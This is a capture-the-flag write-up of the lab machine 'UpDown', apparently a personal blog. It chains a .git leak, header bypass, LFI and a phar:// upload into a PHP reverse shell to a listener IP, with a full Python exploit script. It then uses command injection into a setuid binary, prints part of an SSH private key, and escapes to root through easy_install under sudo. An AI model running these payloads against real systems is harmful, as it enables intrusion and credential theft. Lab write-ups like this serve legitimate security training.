---
title: 'HTB UpDown - Medium'
date: 2024-05-16 00:00:00 +0000
categories: [HTB Machines]
tags: [Medium, Linux, HTB]
---
**UpDown** is a medium HTB machine that provides a **great opportunity for scripting practice**. The user flag is tough; one must **find critical files exposed**, **bypass the WAF**, and **chain LFI and file upload** vulnerabilities. This last step requires extra-enumeration to discover **non-blacklisted functions** and **wrappers**. Lateral movement and root-level access are achievable by exploiting a **GUID flag** and **improper sudoers permissions**, respectively.

<img src="/assets/img/updown/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.227.227

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.227.227 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 80

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.227.227 -sVC -p22,80

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 16:43 WEST
Nmap scan report for siteisup.htb (10.129.227.227)
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds

[+] Script finished successfully
```

This web page receives us on port TCP/80. There is a domain name at the bottom of the page.

<img src="/assets/img/updown/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Appended the domain name to /etc/hosts file.

```bash
echo -e "10.129.227.227\tsiteisup.htb" | sudo tee -a /etc/hosts
10.129.227.227  siteisup.htb
```

Discovered some directories with [Feroxbuster](https://github.com/epi052/feroxbuster).

```bash
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.227.227/ -C 404 -C 403
301      GET        http://10.129.227.227/dev => http://10.129.227.227/dev/
301      GET        http://10.129.227.227/dev/.git => http://10.129.227.227/dev/.git/
```

One of them is a .git directory, so let’s use [git-dumper](https://github.com/arthaud/git-dumper) to inspect it locally.

```bash
git-dumper http://10.129.227.227/dev/.git/ .git

cd .git; tree        
.
├── admin.php
├── changelog.txt
├── checker.php
├── index.php
└── stylesheet.css
```

The ‘admin.php’ file has nothing, but the ‘checker.php’ looks interesting. It contains a file upload functionality that we haven’t seen yet. Note that it does a simple file extension check that we could bypass.

```php
<?php
...
if($_POST['check']){
  
        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
        $file = $_FILES['file']['name'];

        # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }
  
        # Create directory to upload our file.
        $dir = "uploads/".md5(time())."/";
        if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

  # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));
				...
}
```

The ‘index.php’ has a GET parameter that is vulnerable to file inclusion, even with these validations.

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
```

Listing commit logs led us to discover a technique to protect an existing virtual host subdomain.

```bash
git log
```

<img src="/assets/img/updown/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Further enumeration shows that it is expecting a Special-Dev header. Otherwise, access is denied to the subdomain. The next thing we will be doing is virtual host brute-forcing with Ffuf.

```bash
git log -c
```

<img src="/assets/img/updown/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Discovered a dev.siteisup.htb virtual host subdomain, which returns a 403 (forbidden) status code.

```bash
ffuf -u "http://10.129.227.227/" -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 1131
dev     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 59ms]
```

Updated the /etc/hosts file.

```php
tail -n 1 /etc/hosts                                               
10.129.227.227  siteisup.htb dev.siteisup.htb
```

Accessing it without the header blocks us. Fortunately, we have a clue on how to bypass it. 

<img src="/assets/img/updown/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

# Exploitation

We have collected good information about the target:

- There is a dev.siteisup.htb vHost subdomain protected by a HTTP header.
- The checker.php file may be vulnerable to a file upload attack.
- Another PHP file, index.php, expects a ‘page’ GET parameter that may be vulnerable to file inclusion.

Let’s start by creating a match rule in Burp Suite that automatically appends the 'Special-Dev' header.

<img src="/assets/img/updown/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

Successfully bypassed the WAF, accessing the subdomain from our browser.

<img src="/assets/img/updown/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

Changed Burp to dark mode because my eyes were bleeding XD. 

<img src="/assets/img/updown/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

Confirmed that the ‘page’ parameter is vulnerable to LFI by using a PHP Base64 filter.

```
?page=php://filter/convert.base64-encode/resource=checker
```

<img src="/assets/img/updown/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">

Serving a PHP file and trying to escalate this vulnerability to RFI didn’t work. The reason behind this, is that the PHP configuration file has ‘allow_url_include’ disabled, which also blocks the execution of commands with data:// or other wrappers. Let’s try to read the configuration with the next commands.

Uploading a compressed file under a .jpg extension returns a 500 status code.

```bash
echo '<?php phpinfo(); ?>' > info.php && zip info.jpg info.php
```

<img src="/assets/img/updown/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">

The file has been successfully uploaded.

<img src="/assets/img/updown/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">

Trying to use a zip:// wrapper doesn't work.

<img src="/assets/img/updown/Untitled 11.png" alt="Untitled 11.png" style="width:800px;">

But phar:// does.

```
?page=phar://uploads/e52413fa445d68acde487301dea732c5/dusk.jpg/dusk
```

<img src="/assets/img/updown/Untitled 12.png" alt="Untitled 12.png" style="width:800px;">

Bad news, there are a lot of disabled functions (that’s why I couldn’t execute a sh*t).

<img src="/assets/img/updown/Untitled 13.png" alt="Untitled 13.png" style="width:800px;">

Confirmed ‘that allow_url_include’ was not enabled.

<img src="/assets/img/updown/Untitled 14.png" alt="Untitled 14.png" style="width:800px;">

Asked Chat-GPT for PHP functions to achieve RCE.

<img src="/assets/img/updown/Untitled 15.png" alt="Untitled 15.png" style="width:800px;">

Created a simple script to figure out which one to use.

```python
def main():
    disabled_functions = 'pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen'.split(',')
    functions_to_test = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'escapeshellcmd']
    print(f"\n[+] Available function/s: {', '.join(filter(lambda x: x not in disabled_functions, functions_to_test))}")

main()
```

We got some matches.

```python
python3 functions.py

[+] Available function/s: proc_open, escapeshellcmd
```

Asked Chat-GPT again, this time for a reverse shell. This is what I got back.

```php
<?php
$ip = '10.10.14.112'; // Change this to your listener IP
$port = 4444; // Change this to your listener port

$command = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";

$descriptors = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($command, $descriptors, $pipes);
?>
```

Compressed it `zip dusk.jpg dusk.php`, uploaded the archive, and executed it.

```
?page=phar://uploads/52955e2b0b45d0f0ae62921e2bf0a932/dusk.jpg/dusk
```

<img src="/assets/img/updown/Untitled 16.png" alt="Untitled 16.png" style="width:800px;">

A reverse connection has been established to the Netcat listener.

```
nc -nlvp 4444
connect to [10.10.14.112] from (UNKNOWN) [10.129.13.96] 49534

www-data@updown:/var/www/dev$ whoami
www-data

www-data@updown:/var/www/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Here comes the funny part! Created a Python script that automates the steps we just did.

```python
import argparse
import os
import re
import requests
import subprocess
import shlex
import sys

def establish_shell(target):
    url = f'http://{target}/uploads'
    headers = {
        'Host': 'dev.siteisup.htb',
        'Special-Dev': 'only4dev'
    }

    response = requests.get(url, headers=headers)

    # find existing directories in /uploads
    pattern = r'[a-f0-9]{32}'
    matches = list(set(re.findall(pattern, response.text)))

    for dir in matches:
        final_url = f'http://{target}/index.php?page=phar://uploads/{dir}/dusk.jpg/dusk'
        print(f"\n[+] URL: {final_url}")
        response = requests.get(final_url, headers=headers)
    else:
        print("\n[+] Check your Netcat listener! :D")

def create_payload(lhost, lport):
    revshell = f'''<?php
$ip = '{lhost}';
$port = {lport};

$command = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";

$descriptors = array(
0 => array("pipe", "r"),
1 => array("pipe", "w"),
2 => array("pipe", "w")
);

$process = proc_open($command, $descriptors, $pipes);
?>'''
    revshell_compressed_bytes = ""
    
    # compress it the same way as we did manually
    with open("dusk.php", 'w') as f:
        f.write(revshell)
    subprocess.run(shlex.split("/usr/bin/zip ./dusk.jpg ./dusk.php"), stdout=subprocess.DEVNULL)
    with open("dusk.jpg", "rb") as f:
        revshell_compressed_bytes = f.read().hex()
        print(f"\n[+] Generated payload: {revshell_compressed_bytes}")

    # remove all files created
    os.remove("dusk.php")
    os.remove("dusk.jpg")

    return revshell_compressed_bytes

def exploit(target, payload):
    url = f'http://{target}'
    headers = {
        'Host': 'dev.siteisup.htb',
        'Special-Dev': 'only4dev'
    }
    files = {
        'file': ('dusk.jpg', bytes.fromhex(payload), 'image/jpeg'),
        'check': (None, 'Check')
    }

    # upload the file
    response = requests.post(url, headers=headers, files=files)

    if response.status_code == 500:
        print("\n[+] File successfully uploaded") 
    else:
        raise Exception("\n[!] Error. Could NOT upload the file :(")

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB UpDown Exploit"
    )
    parser.add_argument('-t', '--target', dest='target', required=True)
    parser.add_argument('--lhost', dest='lhost', required=True)
    parser.add_argument('--lport', dest='lport', help='Default: 4444', type=int, default=4444)
    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        payload = create_payload(args.lhost, args.lport)
        exploit(args.target, payload)
        establish_shell(args.target)

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)

    except Exception as e:
        print(e)
        sys.exit(1)
    
main()
```

Let's start the Netcat listener and run the script. If we don't provide a local port, TCP/4444 will be used by default.

```bash
python3 updown.py -t 10.129.216.60 --lhost 10.10.14.155

[+] Generated payload: 504b030414000000080081b4af5801a7082da40000000801000008001c006475736b2e7068705554090003c22a4566c22a456675780b000104e803000004e80300006d8ec10a83300c86ef7d8a50c42a386b879e9cf55146ad057bd086561c7bfbb5b8c10e861cfee4275ffec7880b92cc220cc04453a76e6bd175ac27193abfc77d1bab2724d36e5dd536c70de593ddf8a4c202370dec1416640e7c3607df35f288e427a091b96034016613b4b7b83b1f224479afde056960905f4dd1a2a115504fcb8a880be3958cfbb541caf403bdd326247e524f87662b7ec92bf88f10a7741de2d9283f504b01021e0314000000080081b4af5801a7082da400000008010000080018000000000001000000a481000000006475736b2e7068705554050003c22a456675780b000104e803000004e8030000504b050600000000010001004e000000e60000000000

[+] File successfully uploaded

[+] URL: http://10.129.216.60/index.php?page=phar://uploads/272fe75a03b31629b24f77d751930170/dusk.jpg/dusk

[+] Check your Netcat listener! :D
```

**Note**: It worked fine in a fresh VPN with a fresh machine. Just remember to update /etc/hosts :).

And there it is! Transformed it to a pseudo-interactive TTY, and now we can work.

```
nc -nlvp 4444
connect to [10.10.14.155] from (UNKNOWN) [10.129.216.60] 37366

www-data@updown:/var/www/dev$ python3 -c 'import pty;pty.spawn("/bin/bash")'
...

www-data@updown:/var/www/dev$ whoami
www-data

www-data@updown:/var/www/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Lateral Movement

Found another user, called ‘developer’.

```bash
www-data@updown:/var/www/dev$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
developer:x:1002:1002::/home/developer:/bin/bash
```

There is a GUID binary that is executable by www-data.

```bash
www-data@updown:/var/www/dev$ find / -type f -perm /4000 2>/dev/null -exec ls -l {} \;
-rwsr-x--- 1 developer www-data 16928 Jun 22  2022 /home/developer/dev/siteisup
```

This Python script located on the same direcory may contain the source code of the binary.

```bash
www-data@updown:/home/developer/dev$ ls -l
total 24
-rwsr-x--- 1 developer www-data 16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data   154 Jun 22  2022 siteisup_test.py
```

It is using `input()` without sanitization.

```bash
www-data@updown:/home/developer/dev$ cat siteisup_test.py; echo
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

Successfully executed a command as developer by injecting the following code.

```
www-data@updown:/home/developer/dev$ ./siteisup 2>/dev/null
Welcome to 'siteisup.htb' application

__import__('os').system('whoami')
developer
```

Did the exact same to read his SSH key.

```
www-data@updown:/home/developer/dev$ ./siteisup 2>/dev/null
Welcome to 'siteisup.htb' application

__import__('os').system('cat /home/developer/.ssh/id_rsa')
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
...
```

And connected over SSH as developer.

```
ssh -i id_rsa developer@siteisup.htb

developer@updown:~$ whoami
developer

developer@updown:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)
```

# PrivEsc

Listing sudoers permissions reveals that we can run easy_install as root.

```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

[GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/) has a PoC for this binary.

<img src="/assets/img/updown/Untitled 17.png" alt="Untitled 17.png" style="width:800px;">

Followed the steps and escalated privileges to root.

```
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install $TF

# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieved both flags to pwn the box. GGs!

```
# cat /root/root.txt
4af4a39dcc0508bb****************

# cat /home/developer/user.txt
3e0e115249c21b44****************
```